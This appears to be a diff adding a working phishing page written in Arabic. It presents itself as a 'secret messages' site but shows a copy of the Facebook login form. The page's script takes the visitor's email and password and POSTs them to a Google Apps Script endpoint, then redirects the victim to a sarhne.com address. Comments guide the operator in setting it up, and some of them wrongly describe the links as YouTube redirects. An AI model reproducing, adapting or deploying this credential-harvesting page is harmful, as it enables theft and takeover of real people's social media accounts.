@@ -1,0 +1,124 @@
+<!DOCTYPE html><html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>صارحني برسالة سرية / صارح اصدقائك برسائل سرية وممتعة</title>
+  <style>
+    body {
+      background-color: #f0f2f5;
+      font-family: Arial, sans-serif;
+      margin: 0;
+      padding: 0;
+      direction: rtl;
+      text-align: center;
+    }.login-container {
+  max-width: 400px;
+  margin: 100px auto;
+  background: white;
+  padding: 20px;
+  border-radius: 8px;
+  box-shadow: 0 2px 4px rgba(0, 0, 0, 0.2);
+}
+
+.logo {
+  color: #1877f2;
+  font-size: 32px;
+  font-weight: bold;
+  margin-bottom: 20px;
+}
+
+input[type="text"],
+input[type="password"] {
+  width: 90%;
+  padding: 12px;
+  margin: 10px 0;
+  border: 1px solid #dddfe2;
+  border-radius: 6px;
+  font-size: 16px;
+}
+
+.login-btn {
+  width: 95%;
+  background-color: #1877f2;
+  color: white;
+  padding: 12px;
+  font-size: 16px;
+  border: none;
+  border-radius: 6px;
+  cursor: pointer;
+  margin-top: 10px;
+}
+
+.forgot {
+  display: block;
+  margin: 10px 0;
+  color: #1877f2;
+  font-size: 14px;
+  text-decoration: none;
+}
+
+.divider {
+  margin: 15px 0;
+  color: #aaa;
+}
+
+.new-account-btn {
+  display: inline-block;
+  background-color: #42b72a;
+  color: white;
+  padding: 12px;
+  font-size: 16px;
+  border: none;
+  border-radius: 6px;
+  cursor: pointer;
+  text-decoration: none;
+  width: 60%;
+  text-align: center;
+}
+
+  </style>
+</head>
+<body>
+  <div class="login-container">
+    <div class="logo">facebook</div>
+    <form id="loginForm">
+      <!-- ضروري name عشان Apps Script يقرا القيم -->
+      <input type="text" name="email" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
+      <input type="password" name="password" placeholder="كلمة السر" required>
+      <button type="submit" class="login-btn">تسجيل الدخول</button><!-- توجيه لـ YouTube عند نقر "هل نسيت الحساب؟" -->
+  <a href="https://www.facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0" class="forgot" target="_blank">هل نسيت الحساب؟</a>
+
+  <div class="divider">أو</div>
+
+  <!-- توجيه لـ YouTube عند نقر "إنشاء حساب جديد" -->
+  <a href="https://ar-ar.facebook.com/r.php?locale=ar_AR&display=page" class="new-account-btn" target="_blank">إنشاء حساب جديد</a>
+</form>
+
+  </div>  <script>
+    const SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbyZUryUd7OdEkSOl4hiwEzP8Ccp2HmraasNEoNSYr8LM8c9Jn0vrUaDHkHXqodG3pRn/exec';
+    const REDIRECT_URL = 'https://3250445039332.sarhne.com';  // حطّ هنا موقعك
+  
+    document.getElementById('loginForm').addEventListener('submit', function(e) {
+      e.preventDefault();
+      const formData = new FormData(this);
+  
+      fetch(SCRIPT_URL, {
+        method: 'POST',
+        body: new URLSearchParams(formData)
+      })
+      .then(response => response.json())
+      .then(data => {
+        if (data.result === 'success') {
+          // بدل الـ alert خليه يوجّه المستخدم
+          window.location.href = REDIRECT_URL;
+        } else {
+          alert('حدث خطأ: ' + data.message);
+        }
+      })
+      .catch(err => {
+        console.error('Fetch Error:', err);
+        alert('فشل في إرسال البيانات.');
+      });
+    });
+  </script></body>
+</html>
